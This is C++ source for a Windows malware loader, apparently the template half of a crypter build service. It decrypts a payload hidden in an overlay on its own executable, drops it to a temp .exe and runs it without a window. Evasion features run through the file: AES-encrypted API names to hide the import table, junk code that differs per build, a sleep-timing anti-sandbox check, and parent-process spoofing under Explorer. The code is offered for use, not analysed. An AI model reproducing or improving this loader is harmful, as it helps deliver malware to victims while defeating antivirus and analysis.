// SERO Native Loader — generated per-build, all sensitive strings AES-encrypted
// Compile: cl /O2 /GS- /W0 /nologo /EHs-c- /Fe:loader.exe loader.cpp bcrypt.lib kernel32.lib /link /SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:WinMain
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

// Required when using /NODEFAULTLIB with any floating point code
extern "C" int _fltused = 0;

// ── Embedded AES string key (split across 3 arrays, assembled at runtime) ────
// !! SERVER FILLS IN THESE VALUES AT BUILD TIME !!
static const unsigned char SKA[] = {/*SKA*/};
static const unsigned char SKB[] = {/*SKB*/};
static const unsigned char SKC[] = {/*SKC*/};
static const unsigned char SIV[] = {/*SIV*/};

// ── AES-encrypted API/DLL name strings ───────────────────────────────────────
static const unsigned char S_K32[]  = {/*S_K32*/};   // "kernel32.dll"
static const unsigned char S_U32[]  = {/*S_U32*/};   // "user32.dll"
static const unsigned char S_OP[]   = {/*S_OP*/};    // "OpenProcess"
static const unsigned char S_VLA[]  = {/*S_VLA*/};   // "VirtualAlloc"
static const unsigned char S_VLF[]  = {/*S_VLF*/};   // "VirtualFree"
static const unsigned char S_CP[]   = {/*S_CP*/};    // "CreateProcessW"
static const unsigned char S_IPAL[] = {/*S_IPAL*/};  // "InitializeProcThreadAttributeList"
static const unsigned char S_UPA[]  = {/*S_UPA*/};   // "UpdateProcThreadAttribute"
static const unsigned char S_DAL[]  = {/*S_DAL*/};   // "DeleteProcThreadAttributeList"
static const unsigned char S_GSW[]  = {/*S_GSW*/};   // "GetShellWindow"
static const unsigned char S_GWTP[] = {/*S_GWTP*/};  // "GetWindowThreadProcessId"
static const unsigned char S_EXT[]  = {/*S_EXT*/};   // ".exe"
// ── Newly encrypted — file I/O + timing (previously visible in import table) ─
static const unsigned char S_GMFW[] = {/*S_GMFW*/};  // "GetModuleFileNameW"
static const unsigned char S_SLP[]  = {/*S_SLP*/};   // "Sleep"
static const unsigned char S_GTC[]  = {/*S_GTC*/};   // "GetTickCount64"
static const unsigned char S_CFW[]  = {/*S_CFW*/};   // "CreateFileW"
static const unsigned char S_RF[]   = {/*S_RF*/};    // "ReadFile"
static const unsigned char S_GFS[]  = {/*S_GFS*/};   // "GetFileSize"
static const unsigned char S_WF[]   = {/*S_WF*/};    // "WriteFile"
static const unsigned char S_CH[]   = {/*S_CH*/};    // "CloseHandle"
static const unsigned char S_GTP[]  = {/*S_GTP*/};   // "GetTempPathW"
static const unsigned char S_GTFW[] = {/*S_GTFW*/};  // "GetTempFileNameW"
static const unsigned char S_MFW[]  = {/*S_MFW*/};   // "MoveFileW"
static const unsigned char S_MBW[]  = {/*S_MBW*/};   // "MultiByteToWideChar"

// ── Junk functions (dead code, different each build) ─────────────────────────
{/*JUNK_DEFS*/}

// ── Overlay magic (C++ loader uses different magic from C# loader) ─────────
static const BYTE MAGIC[8] = {0x5E,0x43,0x50,0x50,0x4C,0x30,0x44,0x52}; // ^CPPL0DR

// ── AES string decrypt (BCrypt, returns HeapAlloc'd buffer, caller frees) ────
static char* AesDecStr(const unsigned char* enc, int encLen) {
    unsigned char k[32] = {};
    int la = (int)sizeof(SKA), lb = (int)sizeof(SKB), lc = (int)sizeof(SKC);
    memcpy(k, SKA, la);
    memcpy(k + la, SKB, lb);
    memcpy(k + la + lb, SKC, lc);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObj = 0, cbData = 0, outLen = 0;
    char* result = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) goto end;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0);

    BYTE* keyObj = (BYTE*)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
    BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj, cbKeyObj, k, 32, 0);

    unsigned char iv[16]; memcpy(iv, SIV, 16);
    BCryptDecrypt(hKey, (PUCHAR)enc, encLen, NULL, iv, 16, NULL, 0, &outLen, BCRYPT_BLOCK_PADDING);
    result = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, outLen + 1);
    memcpy(iv, SIV, 16);
    BCryptDecrypt(hKey, (PUCHAR)enc, encLen, NULL, iv, 16, (PUCHAR)result, outLen, &outLen, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, keyObj);
end:
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// ── Payload AES-256-CBC decrypt ───────────────────────────────────────────────
static BOOL AesDecPayload(const BYTE* key, const BYTE* iv,
                          const BYTE* in, DWORD inLen,
                          BYTE** out, DWORD* outLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKO = 0, cbD = 0;
    BOOL ok = FALSE;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return FALSE;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKO, sizeof(DWORD), &cbD, 0);
    BYTE* ko = (BYTE*)HeapAlloc(GetProcessHeap(), 0, cbKO);
    BCryptGenerateSymmetricKey(hAlg, &hKey, ko, cbKO, (PUCHAR)key, 32, 0);

    BYTE iv2[16]; memcpy(iv2, iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)in, inLen, NULL, iv2, 16, NULL, 0, outLen, BCRYPT_BLOCK_PADDING);
    *out = (BYTE*)HeapAlloc(GetProcessHeap(), 0, *outLen);
    memcpy(iv2, iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)in, inLen, NULL, iv2, 16, *out, *outLen, outLen, BCRYPT_BLOCK_PADDING) >= 0)
        ok = TRUE;
    else { HeapFree(GetProcessHeap(), 0, *out); *out = NULL; }

    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, ko);
    return ok;
}

// ── Dynamic API typedefs ──────────────────────────────────────────────────────
typedef HANDLE    (WINAPI* fnOpenProcess)(DWORD,BOOL,DWORD);
typedef LPVOID    (WINAPI* fnVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL      (WINAPI* fnVirtualFree)(LPVOID,SIZE_T,DWORD);
typedef BOOL      (WINAPI* fnCreateProcessW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef BOOL      (WINAPI* fnInitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST,DWORD,DWORD,PSIZE_T);
typedef BOOL      (WINAPI* fnUpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST,DWORD,DWORD_PTR,PVOID,SIZE_T,PVOID,PSIZE_T);
typedef VOID      (WINAPI* fnDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef HWND      (WINAPI* fnGetShellWindow)(void);
typedef DWORD     (WINAPI* fnGetWindowThreadProcessId)(HWND,LPDWORD);
typedef DWORD     (WINAPI* fnGetModuleFileNameW)(HMODULE,LPWSTR,DWORD);
typedef void      (WINAPI* fnSleep_t)(DWORD);
typedef ULONGLONG (WINAPI* fnGetTickCount64_t)();
typedef HANDLE    (WINAPI* fnCreateFileW)(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL      (WINAPI* fnReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef DWORD     (WINAPI* fnGetFileSize)(HANDLE,LPDWORD);
typedef BOOL      (WINAPI* fnWriteFile)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL      (WINAPI* fnCloseHandle)(HANDLE);
typedef DWORD     (WINAPI* fnGetTempPathW)(DWORD,LPWSTR);
typedef UINT      (WINAPI* fnGetTempFileNameW)(LPCWSTR,LPCWSTR,UINT,LPWSTR);
typedef BOOL      (WINAPI* fnMoveFileW)(LPCWSTR,LPCWSTR);
typedef int       (WINAPI* fnMultiByteToWideChar)(UINT,DWORD,LPCCH,int,LPWSTR,int);

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // ── Junk calls (dead code, different each build) ──────────────────────────
    {/*JUNK_CALLS*/}

    // ── Resolve kernel32 + user32 handles ────────────────────────────────────
    char* s_k32 = AesDecStr(S_K32, sizeof(S_K32));
    char* s_u32 = AesDecStr(S_U32, sizeof(S_U32));
    HMODULE hK32 = GetModuleHandleA(s_k32);
    HMODULE hU32 = LoadLibraryA(s_u32);
    HeapFree(GetProcessHeap(), 0, s_k32);
    HeapFree(GetProcessHeap(), 0, s_u32);
    if (!hK32 || !hU32) return 0;

    char* t; // temp for name decryption

    // ── Resolve timing functions first (needed for anti-sandbox) ─────────────
    t = AesDecStr(S_SLP,  sizeof(S_SLP));
    auto fnSLP  = (fnSleep_t)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GTC,  sizeof(S_GTC));
    auto fnGTC  = (fnGetTickCount64_t)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    if (!fnSLP || !fnGTC) return 0;

    // ── Anti-sandbox ─────────────────────────────────────────────────────────
    ULONGLONG t0 = fnGTC();
    fnSLP(2000);
    if (fnGTC() - t0 < 1400) return 0;

    // ── Resolve all remaining APIs ────────────────────────────────────────────
    t = AesDecStr(S_OP,   sizeof(S_OP));
    auto fnOP   = (fnOpenProcess)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_VLA,  sizeof(S_VLA));
    auto fnVA   = (fnVirtualAlloc)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_VLF,  sizeof(S_VLF));
    auto fnVF   = (fnVirtualFree)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_CP,   sizeof(S_CP));
    auto fnCP   = (fnCreateProcessW)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_IPAL, sizeof(S_IPAL));
    auto fnIPAL = (fnInitializeProcThreadAttributeList)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_UPA,  sizeof(S_UPA));
    auto fnUPA  = (fnUpdateProcThreadAttribute)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_DAL,  sizeof(S_DAL));
    auto fnDAL  = (fnDeleteProcThreadAttributeList)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GSW,  sizeof(S_GSW));
    auto fnGSW  = (fnGetShellWindow)GetProcAddress(hU32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GWTP, sizeof(S_GWTP));
    auto fnGWTP = (fnGetWindowThreadProcessId)GetProcAddress(hU32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GMFW, sizeof(S_GMFW));
    auto fnGMFW = (fnGetModuleFileNameW)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_CFW,  sizeof(S_CFW));
    auto fnCFW  = (fnCreateFileW)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_RF,   sizeof(S_RF));
    auto fnRF   = (fnReadFile)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GFS,  sizeof(S_GFS));
    auto fnGFS  = (fnGetFileSize)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_WF,   sizeof(S_WF));
    auto fnWF   = (fnWriteFile)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_CH,   sizeof(S_CH));
    auto fnCH   = (fnCloseHandle)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GTP,  sizeof(S_GTP));
    auto fnGTP  = (fnGetTempPathW)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_GTFW, sizeof(S_GTFW));
    auto fnGTFW = (fnGetTempFileNameW)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_MFW,  sizeof(S_MFW));
    auto fnMFW  = (fnMoveFileW)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    t = AesDecStr(S_MBW,  sizeof(S_MBW));
    auto fnMBW  = (fnMultiByteToWideChar)GetProcAddress(hK32, t); HeapFree(GetProcessHeap(), 0, t);

    if (!fnOP || !fnVA || !fnCP || !fnIPAL || !fnUPA || !fnDAL || !fnGSW || !fnGWTP
     || !fnGMFW || !fnCFW || !fnRF || !fnGFS || !fnWF || !fnCH
     || !fnGTP  || !fnGTFW || !fnMFW || !fnMBW) return 0;

    // ── Read self and find overlay ────────────────────────────────────────────
    wchar_t selfPath[MAX_PATH];
    fnGMFW(NULL, selfPath, MAX_PATH);

    HANDLE hSelf = fnCFW(selfPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) return 0;
    DWORD fSize = fnGFS(hSelf, NULL);
    BYTE* fBuf  = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fSize);
    DWORD br = 0;
    fnRF(hSelf, fBuf, fSize, &br, NULL);
    fnCH(hSelf);

    // Search magic from end
    int mPos = -1;
    for (int i = (int)fSize - 8; i >= 0; i--) {
        if (memcmp(fBuf + i, MAGIC, 8) == 0) { mPos = i; break; }
    }
    if (mPos < 0) { HeapFree(GetProcessHeap(), 0, fBuf); return 0; }

    // Overlay: MAGIC(8) + KEY(32) + IV(16) + ENCLEN(4) + ENCRYPTED
    BYTE* key  = fBuf + mPos + 8;
    BYTE* iv   = key + 32;
    DWORD eLen = *(DWORD*)(iv + 16);
    BYTE* enc  = iv + 16 + 4;

    BYTE* payload = NULL; DWORD pLen = 0;
    if (!AesDecPayload(key, iv, enc, eLen, &payload, &pLen)) {
        HeapFree(GetProcessHeap(), 0, fBuf); return 0;
    }
    HeapFree(GetProcessHeap(), 0, fBuf);

    // ── Write payload to temp file ────────────────────────────────────────────
    wchar_t tmpDir[MAX_PATH], tmpBase[MAX_PATH], tmpExe[MAX_PATH + 8];
    fnGTP(MAX_PATH, tmpDir);
    fnGTFW(tmpDir, L"sr", 0, tmpBase);

    // Build .exe path: tmpBase + ".exe" (AES-decrypt ".exe" at runtime)
    char* ext = AesDecStr(S_EXT, sizeof(S_EXT));
    wchar_t wext[8] = {};
    fnMBW(CP_ACP, 0, ext, -1, wext, 8);
    HeapFree(GetProcessHeap(), 0, ext);

    // Manual wcscat (no CRT)
    { DWORD _i=0; while(tmpBase[_i]){tmpExe[_i]=tmpBase[_i];_i++;} DWORD _j=0; while(wext[_j]){tmpExe[_i+_j]=wext[_j];_j++;} tmpExe[_i+_j]=0; }
    fnMFW(tmpBase, tmpExe);

    HANDLE hOut = fnCFW(tmpExe, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) { HeapFree(GetProcessHeap(), 0, payload); return 0; }
    DWORD wr = 0;
    fnWF(hOut, payload, pLen, &wr, NULL);
    fnCH(hOut);
    HeapFree(GetProcessHeap(), 0, payload);

    // ── PPID spoof: launch as child of Explorer ───────────────────────────────
    HWND shellWnd = fnGSW ? fnGSW() : NULL;
    DWORD explorerPid = 0;
    if (shellWnd && fnGWTP) fnGWTP(shellWnd, &explorerPid);

    HANDLE hExp = explorerPid ? fnOP(PROCESS_CREATE_PROCESS, FALSE, explorerPid) : NULL;

    SIZE_T attrSz = 0;
    fnIPAL(NULL, 1, 0, &attrSz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)fnVA(NULL, attrSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    fnIPAL(attrList, 1, 0, &attrSz);
    if (hExp) fnUPA(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExp, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXW si = {};
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;
    PROCESS_INFORMATION pi = {};

    fnCP(NULL, tmpExe, NULL, NULL, FALSE,
         EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
         NULL, NULL, &si.StartupInfo, &pi);

    if (pi.hThread)  fnCH(pi.hThread);
    if (pi.hProcess) fnCH(pi.hProcess);

    fnDAL(attrList);
    fnVF(attrList, 0, MEM_RELEASE);
    if (hExp) fnCH(hExp);

    return 0;
}
